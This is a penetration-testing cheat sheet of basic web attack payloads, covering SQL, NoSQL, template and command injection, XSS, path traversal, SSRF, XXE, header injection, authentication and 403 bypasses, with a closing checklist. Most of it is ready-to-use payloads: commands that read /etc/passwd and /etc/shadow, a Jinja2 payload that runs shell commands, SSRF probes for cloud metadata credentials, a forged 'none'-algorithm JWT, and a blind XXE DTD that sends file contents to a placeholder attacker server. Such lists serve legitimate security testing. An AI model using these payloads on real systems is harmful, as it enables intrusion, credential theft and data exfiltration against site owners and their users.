# 01 — Fundamentals: Payloads

> These are basic, foundational payloads for initial testing. Full exploitation payloads are in section 03. Use these to quickly identify if a parameter is vulnerable.

---

## 🔴 Quick Detection Payloads

### SQL Injection Detection

```
# String-based detection
'
"
' OR '1'='1
" OR "1"="1
' OR 1=1-- -
" OR 1=1-- -
' OR 1=1#
admin'--
1' ORDER BY 1-- -
1' UNION SELECT NULL-- -

# Numeric-based detection
1 OR 1=1
1' OR '1'='1
1 AND 1=2

# Time-based detection (blind SQLi)
' OR SLEEP(5)-- -
'; WAITFOR DELAY '0:0:5'-- -
' OR pg_sleep(5)-- -
1 AND IF(1=1, SLEEP(5), 0)

# Error-based detection
' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))-- -
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

### XSS Detection

```html
<!-- Basic probes -->
<script>alert(1)</script>
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
<details open ontoggle=alert(1)>

<!-- Attribute injection -->
" onfocus=alert(1) autofocus="
' onfocus=alert(1) autofocus='
" onmouseover=alert(1) "

<!-- Without parentheses -->
<img src=x onerror=alert`1`>
<svg onload=alert`1`>

<!-- Without alert -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=console.log(document.cookie)>

<!-- DOM-based (for URL parameters reflected in page) -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### Command Injection Detection

```bash
# Inline execution
; id
; whoami
| id
|| id
& id
&& id
`id`
$(id)

# With newline
%0a id
%0d%0a id

# Concatenation
;cat /etc/passwd
| cat /etc/passwd
&& cat /etc/passwd

# Time-based detection
; sleep 5
| sleep 5
& sleep 5
`sleep 5`
$(sleep 5)

# Windows variants
& dir
| dir
; dir
& type C:\Windows\System32\drivers\etc\hosts
```

### SSTI (Server-Side Template Injection) Detection

```
# Universal probe — if "49" appears in output, SSTI confirmed
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}          # If "7777777" appears → Jinja2/Twig
${7*7}             # Java EL

# Jinja2 (Python)
{{config}}
{{config.items()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Path Traversal Detection

```
# Linux
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
/etc/passwd
/etc/shadow

# Windows
..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts

# Null byte (older systems)
../../../etc/passwd%00
../../../etc/passwd%00.jpg
```

### SSRF Detection

```
# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Internal network
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8080
http://127.0.0.1:3306

# DNS rebinding
http://spoofed.burpcollaborator.net
http://your-collaborator.oastify.com

# Protocol smuggling
file:///etc/passwd
gopher://127.0.0.1:25/
dict://127.0.0.1:11211/
```

### XXE (XML External Entity) Detection

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>

<!-- Blind XXE with external DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/evil.dtd">
  %xxe;
]>
<root>test</root>

<!-- evil.dtd on your server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%eval;
%exfiltrate;
```

### Header Injection

```
# Host header injection
Host: evil.com
Host: target.com
X-Forwarded-Host: evil.com
X-Host: evil.com

# CRLF injection (HTTP response splitting)
%0d%0aSet-Cookie:%20admin=true
%0d%0aLocation:%20https://evil.com

# IP spoofing headers
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

---

## 🔴 Authentication Bypass Payloads

```
# Default credentials (always try first)
admin:admin
admin:password
admin:123456
root:root
root:toor
test:test
guest:guest
user:user

# SQL injection auth bypass
admin' OR 1=1-- -
admin' OR '1'='1
' OR 1=1-- -
' OR '1'='1'-- -
admin'/*
' OR 1=1#

# NoSQL injection auth bypass
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}

# JWT none algorithm
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"user":"admin","role":"admin"}
# Signature: (empty)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

---

## 🔴 403 Bypass Payloads

```
# Path manipulation
/admin → 403
/Admin → ?
/ADMIN → ?
/admin/ → ?
/admin/. → ?
/./admin → ?
/admin..;/ → ?
/admin;.js → ?
/%2f/admin → ?
/admin%20 → ?
/admin%09 → ?
/admin.json → ?
/admin.css → ?
/admin?.js → ?

# Header bypass
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1

# Method bypass
GET /admin → 403
POST /admin → ?
PUT /admin → ?
```

---

## 📋 Payload Testing Checklist

For each input parameter you find:

```
□ SQL injection (', ", OR 1=1)
□ XSS (<script>, <img onerror>)
□ Command injection (; id, | id)
□ Template injection ({{7*7}})
□ Path traversal (../../etc/passwd)
□ Null byte (%00)
□ Long input (5000+ characters)
□ Empty input
□ Special characters (!@#$%^&*())
□ Unicode characters
□ Negative numbers (if numeric expected)
□ Very large numbers
□ Array instead of string (param[]=value)
□ JSON injection (if JSON body)
□ Type juggling (0, false, null, undefined)
```
